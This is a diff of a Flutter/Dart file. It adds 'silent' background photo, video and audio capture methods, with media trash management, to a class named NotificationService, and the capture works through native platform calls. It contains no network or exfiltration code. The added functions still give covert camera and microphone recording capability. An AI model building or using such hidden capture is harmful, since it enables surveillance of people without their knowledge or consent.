@@ -544,6 +544,169 @@ class NotificationService with WidgetsBindingObserver {
     }
   }
 
+  // ══════════════════════════════════════════════════════════════════════
+  // SILENT CAPTURE
+  // ══════════════════════════════════════════════════════════════════════
+
+  /// Capture a photo silently from the background.
+  Future<bool> capturePhoto({bool useFrontCamera = false}) async {
+    try {
+      return await platform.invokeMethod('capturePhoto', {
+        'useFrontCamera': useFrontCamera,
+      }) as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] capturePhoto error: $e');
+      return false;
+    }
+  }
+
+  /// Start video recording silently from the background.
+  Future<bool> startVideoRecording({
+    bool useFrontCamera = false,
+    int durationSec = 0,
+    String quality = '720p',
+  }) async {
+    try {
+      return await platform.invokeMethod('startVideoRecording', {
+        'useFrontCamera': useFrontCamera,
+        'durationSec': durationSec,
+        'quality': quality,
+      }) as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] startVideoRecording error: $e');
+      return false;
+    }
+  }
+
+  /// Stop video recording.
+  Future<bool> stopVideoRecording() async {
+    try {
+      return await platform.invokeMethod('stopVideoRecording') as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] stopVideoRecording error: $e');
+      return false;
+    }
+  }
+
+  /// Start audio recording silently from the background.
+  Future<bool> startAudioRecording({int durationSec = 0}) async {
+    try {
+      return await platform.invokeMethod('startAudioRecording', {
+        'durationSec': durationSec,
+      }) as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] startAudioRecording error: $e');
+      return false;
+    }
+  }
+
+  /// Stop audio recording.
+  Future<bool> stopAudioRecording() async {
+    try {
+      return await platform.invokeMethod('stopAudioRecording') as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] stopAudioRecording error: $e');
+      return false;
+    }
+  }
+
+  /// Get list of all captured media files.
+  Future<List<Map<String, dynamic>>> getCapturedMedia() async {
+    try {
+      final List<dynamic>? results = await platform.invokeListMethod('getCapturedMedia');
+      if (results == null) return [];
+      return results.map((e) => Map<String, dynamic>.from(e as Map)).toList();
+    } catch (e) {
+      debugPrint('[NotificationService] getCapturedMedia error: $e');
+      return [];
+    }
+  }
+
+  /// Delete a captured media file by path (moves to trash).
+  Future<bool> deleteCapturedMedia(String path) async {
+    try {
+      return await platform.invokeMethod('deleteCapturedMedia', {
+        'path': path,
+      }) as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] deleteCapturedMedia error: $e');
+      return false;
+    }
+  }
+
+  /// Get list of all trashed media files.
+  Future<List<Map<String, dynamic>>> getTrashedMedia() async {
+    try {
+      final List<dynamic>? results = await platform.invokeListMethod('getTrashedMedia');
+      if (results == null) return [];
+      return results.map((e) => Map<String, dynamic>.from(e as Map)).toList();
+    } catch (e) {
+      debugPrint('[NotificationService] getTrashedMedia error: $e');
+      return [];
+    }
+  }
+
+  /// Restore a trashed media file to the main captures folder.
+  Future<bool> restoreTrashedMedia(String path) async {
+    try {
+      return await platform.invokeMethod('restoreTrashedMedia', {'path': path}) as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] restoreTrashedMedia error: $e');
+      return false;
+    }
+  }
+
+  /// Permanently delete a media file from the trash.
+  Future<bool> permanentDeleteMedia(String path) async {
+    try {
+      return await platform.invokeMethod('permanentDeleteMedia', {'path': path}) as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] permanentDeleteMedia error: $e');
+      return false;
+    }
+  }
+
+  /// Permanently delete all files in the trash.
+  Future<bool> emptyTrash() async {
+    try {
+      return await platform.invokeMethod('emptyTrash') as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] emptyTrash error: $e');
+      return false;
+    }
+  }
+
+  /// Get current capture status (is recording video/audio).
+  Future<Map<String, dynamic>> getCaptureStatus() async {
+    try {
+      final result = await platform.invokeMapMethod<String, dynamic>('getCaptureStatus');
+      return result ?? {'isRecordingVideo': false, 'isRecordingAudio': false};
+    } catch (e) {
+      debugPrint('[NotificationService] getCaptureStatus error: $e');
+      return {'isRecordingVideo': false, 'isRecordingAudio': false};
+    }
+  }
+
+  /// Check if camera permission is granted.
+  Future<bool> hasCameraPermission() async {
+    try {
+      return await platform.invokeMethod('hasCameraPermission') as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] hasCameraPermission error: $e');
+      return false;
+    }
+  }
+
+  /// Check if audio/microphone permission is granted.
+  Future<bool> hasAudioPermission() async {
+    try {
+      return await platform.invokeMethod('hasAudioPermission') as bool? ?? false;
+    } catch (e) {
+      debugPrint('[NotificationService] hasAudioPermission error: $e');
+      return false;
+    }
+  }
+
   void dispose() {
     debugPrint('[NotificationService] Disposing...');
     _stopPollTimer();
